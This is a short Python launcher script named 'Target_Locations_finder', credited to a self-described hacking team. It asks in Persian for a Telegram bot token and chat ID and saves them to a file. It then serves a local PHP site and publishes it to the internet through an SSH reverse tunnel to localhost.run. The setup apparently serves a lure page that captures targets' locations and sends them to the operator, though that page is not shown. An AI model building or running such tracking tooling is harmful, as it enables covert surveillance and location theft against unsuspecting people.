#/usr/bin/env python3
# Target_Locations_finder V 1.0.1
# coded by: hack4lx
# 👊 ʍ4ղíƒҽՏԵ0 ϲվҍҽɾ ՏҽϲմɾíԵվ Եҽɑʍ™💪
# Thank You :  @rainboy1 | @KindKhers4lx | @Mohsening | @Vampire4lx | @erfan4lx | @HatBLACK4LX

import os
os.system("clear")
print(''' \033[92m


 $$\                           $$\       $$\   $$\ $$\           
$$ |                          $$ |      $$ |  $$ |$$ |          
$$$$$$$\   $$$$$$\   $$$$$$$\ $$ |  $$\ $$ |  $$ |$$ |$$\   $$\ 
$$  __$$\  \____$$\ $$  _____|$$ | $$  |$$$$$$$$ |$$ |\$$\ $$  |
$$ |  $$ | $$$$$$$ |$$ /      $$$$$$  / \_____$$ |$$ | \$$$$  / 
$$ |  $$ |$$  __$$ |$$ |      $$  _$$<        $$ |$$ | $$  $$<  
$$ |  $$ |\$$$$$$$ |\$$$$$$$\ $$ | \$$\       $$ |$$ |$$  /\$$\ 
\__|  \__| \_______| \_______|\__|  \__|      \__|\__|\__/  \__|


''')
open('bot-data.txt', 'w').close()
token = input("توکن ربات خود را درج کنید: ")
chat_id = input("آیدی عددی خود را درج کنید: ")
f = open("bot-data.txt", "a")
f.write(token+"$"+chat_id)
f.close()
os.system("php -S localhost:8080 | ssh -R 80:localhost:8080 ssh.localhost.run")


